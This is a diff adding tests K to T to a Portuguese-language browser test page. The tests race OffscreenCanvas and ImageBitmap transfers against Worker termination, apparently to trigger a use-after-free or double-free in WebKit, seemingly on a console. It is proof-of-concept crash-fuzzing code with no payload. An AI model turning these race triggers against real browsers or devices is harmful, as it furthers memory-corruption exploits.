@@ -21,11 +21,22 @@
     <button onclick="runTestE_FixedTiming(10)">[E2] w.terminate() fixo em 10ms</button>
     <button onclick="runTestE_FixedTiming(15)">[E3] w.terminate() fixo em 15ms</button>
 
+    <h2>[F-T] Testes de POC minima</h2>
     <button onclick="runTestF_SingleWorker()">[F] Worker Unico + Flood IPC (Testa roteamento de VRAM)</button>
     <button onclick="runTestG_VRAMExhaustion()">[G] Exaustao de VRAM Pura (Sem Workers/IPC)</button>
     <button onclick="runTestH_SlowDrip()">[H] Slow Drip 50ms (Descobre o numero exato para o crash)</button>
     <button onclick="runTestI_ImmediateTeardown()">[I] Teardown Imediato (Colisao sincrona no mesmo frame)</button>
     <button onclick="runTestJ_ThreadFlood()">[J] Pthread Flood Pura (Sem manipular Canvas/VRAM)</button>
+    <button onclick="runTestK_ForcedVRAMAllocation()">[K] VRAM Forcada (Desenhar no Canvas antes de transferir)</button>
+    <button onclick="runTestL_MessageChannelIPC()">[L] Roteamento IPC via MessageChannel (Ignora a fila do Worker)</button>
+    <button onclick="runTestM_StrictImageBitmap()">[M] Strict Path: Apenas ImageBitmap (Sem fallback)</button>
+    <button onclick="runTestN_StrictOffscreenCanvas()">[N] Strict Path: Apenas OffscreenCanvas (Sem ImageBitmap)</button>
+    <button onclick="runTestO_GarbageCollectionDeath()">[O] Teardown via Garbage Collector (Sem w.terminate explicito)</button>
+    <button onclick="runTestP_MicroCanvas()">[P] Micro-Canvas 1x1 (Descarta OOM de VRAM)</button>
+    <button onclick="runTestQ_WorkerSuicide()">[Q] Worker Suicida (self.close interno vs w.terminate externo)</button>
+    <button onclick="runTestR_DoubleFreeIPC()">[R] Double-Free IPC (Corrida de Neutering C++)</button>
+    <button onclick="runTestS_GhostRouting()">[S] Ghost Routing (postMessage apos w.terminate)</button>
+    <button onclick="runTestT_WebGLContextDriver()">[T] WebGL Driver Path (getContext('webgl') antes do transfer)</button>
 
     <br><br>
     <button class="stop-btn" onclick="stopAll()">[ PARAR EXECUCAO ATUAL ]</button>
@@ -305,6 +316,270 @@
                 count++;
                 if (count % 65 === 0) log(`Threads mortas aleatoriamente: ${count}`);
                 if (count > 800) { clearInterval(currentInterval); log("[+] Teste J finalizado."); }
+            }, 13);
+        }
+// --- [K] VRAM Forçada (Lazy Allocation Defeat) ---
+        // O WebKit pode não alocar VRAM até você desenhar. Testamos se o crash exige VRAM real.
+        function runTestK_ForcedVRAMAllocation() {
+            stopAll();
+            log("[*] Iniciando Teste K: VRAM Forçada (getContext + fillRect)...");
+            const workerCode = `onmessage = (e) => { };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                
+                // GATILHO: Força o driver da AMD a alocar memória física
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = 'red';
+                ctx.fillRect(0, 0, 128, 128); 
+                
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                
+                setTimeout(() => { w.terminate(); }, 7 + Math.random() * 13);
+                
+                count++;
+                if (count % 65 === 0) log(`Teste K - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log("[+] Teste K finalizado."); }
+            }, 13);
+        }
+
+        // --- [L] Roteamento via MessageChannel ---
+        // Isola o bug: É no Worker em si ou no motor de transferência do IPC partilhado?
+        function runTestL_MessageChannelIPC() {
+            stopAll();
+            log("[*] Iniciando Teste L: MessageChannel IPC (Bypass Worker Queue)...");
+            const workerCode = `onmessage = (e) => { let port = e.ports[0]; port.onmessage = (msg) => {}; };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const mc = new MessageChannel();
+                
+                // Estabelece a ponte
+                w.postMessage("init", [mc.port2]);
+                
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                // GATILHO: Envia pela porta dedicada, não pelo Worker
+                try { mc.port1.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                
+                setTimeout(() => { w.terminate(); mc.port1.close(); }, 7 + Math.random() * 13);
+                
+                count++;
+                if (count % 65 === 0) log(`Teste L - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log("[+] Teste L finalizado."); }
+            }, 13);
+        }
+
+        // --- [M] Strict Path: Apenas ImageBitmap ---
+        function runTestM_StrictImageBitmap() {
+            stopAll();
+            log("[*] Iniciando Teste M: Strict ImageBitmap Path...");
+            const workerCode = `onmessage = (e) => { };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                
+                // GATILHO: Força a criação de um ImageBitmap explicitamente
+                createImageBitmap(canvas).then(bmp => {
+                    try { w.postMessage({bmp: bmp}, [bmp]); } catch(e) {}
+                    setTimeout(() => { w.terminate(); }, 7 + Math.random() * 13);
+                });
+                
+                count++;
+                if (count % 65 === 0) log(`Teste M - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log("[+] Teste M finalizado."); }
+            }, 13);
+        }
+
+        // --- [N] Strict Path: Apenas OffscreenCanvas ---
+        function runTestN_StrictOffscreenCanvas() {
+            stopAll();
+            log("[*] Iniciando Teste N: Strict OffscreenCanvas Path...");
+            const workerCode = `onmessage = (e) => { };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                
+                // GATILHO: Transfere a própria classe estrutural, sem conversão para Bitmap
+                try { w.postMessage({canvas: canvas}, [canvas]); } catch(e) {}
+                setTimeout(() => { w.terminate(); }, 7 + Math.random() * 13);
+                
+                count++;
+                if (count % 65 === 0) log(`Teste N - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log("[+] Teste N finalizado."); }
+            }, 13);
+        }
+
+        // --- [O] Teardown via Garbage Collector ---
+        // Se o kernel morrer aqui, o problema não é o 'terminate()', mas a limpeza de memória nativa.
+        function runTestO_GarbageCollectionDeath() {
+            stopAll();
+            log("[*] Iniciando Teste O: GC Death (Sem terminate explícito)...");
+            const workerCode = `onmessage = (e) => { };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                let w = new Worker(url);
+                let canvas = new OffscreenCanvas(128, 128);
+                let transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                
+                // GATILHO: Anulamos as referências e forçamos pressão de memória
+                // O WebKit GC fará a limpeza da thread nativa em background.
+                setTimeout(() => {
+                    w = null;
+                    canvas = null;
+                    transferred = null;
+                    // Aloca lixo para acordar o GC do motor JS
+                    let garbage = new Uint8Array(1024 * 1024 * 5); 
+                }, 7 + Math.random() * 13);
+                
+                count++;
+                if (count % 65 === 0) log(`Teste O - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log("[+] Teste O finalizado."); }
+            }, 13);
+        }
+ // --- [P] Micro-Canvas 1x1 ---
+        // Se o crash ocorrer com um canvas de 1 pixel, provamos 100% que é um erro lógico 
+        // de ponteiro (UAF) e não um esgotamento da memória de vídeo do console.
+        function runTestP_MicroCanvas() {
+            stopAll();
+            log("[*] Iniciando Teste P: Micro-Canvas 1x1...");
+            const url = URL.createObjectURL(new Blob(["onmessage = (e) => {};"], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                // GATILHO: Tamanho ínfimo. Aloca quase 0 bytes na VRAM.
+                const canvas = new OffscreenCanvas(1, 1);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                setTimeout(() => { w.terminate(); }, 7 + Math.random() * 13);
+                
+                count++;
+                if (count % 65 === 0) log(`Teste P - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log("[+] Teste P finalizado."); }
+            }, 13);
+        }
+
+        // --- [Q] Worker Suicida ---
+        // Altera a ordem de destruição. Em vez do WebKit matar a thread do FreeBSD (terminate),
+        // a própria thread chama pthread_exit() via self.close().
+        function runTestQ_WorkerSuicide() {
+            stopAll();
+            log("[*] Iniciando Teste Q: Worker Suicida (self.close)...");
+            // GATILHO: O Worker aniquila-se a si próprio imediatamente após receber o ponteiro
+            const workerCode = `onmessage = (e) => { self.close(); };`;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                
+                // Sem w.terminate(). A morte vem de dentro.
+                
+                count++;
+                if (count % 65 === 0) log(`Teste Q - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log("[+] Teste Q finalizado."); }
+            }, 13);
+        }
+
+        // --- [R] Double-Free IPC ---
+        // Tenta contornar as proteções do C++ transferindo o mesmo ponteiro de VRAM 
+        // para duas threads diferentes simultaneamente.
+        function runTestR_DoubleFreeIPC() {
+            stopAll();
+            log("[*] Iniciando Teste R: Double-Free IPC Race...");
+            const url = URL.createObjectURL(new Blob(["onmessage = (e) => {};"], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w1 = new Worker(url);
+                const w2 = new Worker(url); // Segundo worker
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                // GATILHO: Dispara o detach duas vezes seguidas antes do motor JS processar a invalidação
+                try { w1.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                try { w2.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                
+                setTimeout(() => { w1.terminate(); w2.terminate(); }, 10);
+                
+                count++;
+                if (count % 65 === 0) log(`Teste R - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log("[+] Teste R finalizado."); }
+            }, 13);
+        }
+
+        // --- [S] Ghost Routing ---
+        // Envia a textura gráfica para o IPC *depois* da thread já ter recebido a ordem de execução.
+        function runTestS_GhostRouting() {
+            stopAll();
+            log("[*] Iniciando Teste S: Ghost Routing (postMessage pós-terminate)...");
+            const url = URL.createObjectURL(new Blob(["onmessage = (e) => {};"], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                // GATILHO: Inverte a ordem
+                w.terminate(); 
+                
+                // Tenta rotear o descritor físico para a thread morta no mesmo tick
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                
+                count++;
+                if (count % 65 === 0) log(`Teste S - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log("[+] Teste S finalizado."); }
+            }, 13);
+        }
+
+        // --- [T] WebGL Driver Path ---
+        // O WebKit tem caminhos de código completamente diferentes para OffscreenCanvas se você
+        // inicializar o contexto 2D versus o contexto WebGL (que fala mais baixo no driver).
+        function runTestT_WebGLContextDriver() {
+            stopAll();
+            log("[*] Iniciando Teste T: WebGL Driver Path...");
+            const url = URL.createObjectURL(new Blob(["onmessage = (e) => {};"], {type: "text/javascript"}));
+            
+            let count = 0;
+            currentInterval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                
+                // GATILHO: Liga o Canvas à pipeline do WebGL/OpenGL do console antes de desanexar
+                try { canvas.getContext('webgl'); } catch(e) {}
+                
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
+                
+                setTimeout(() => { w.terminate(); }, 7 + Math.random() * 13);
+                
+                count++;
+                if (count % 65 === 0) log(`Teste T - Iterações: ${count}`);
+                if (count > 800) { stopAll(); log("[+] Teste T finalizado."); }
             }, 13);
         }
     </script>
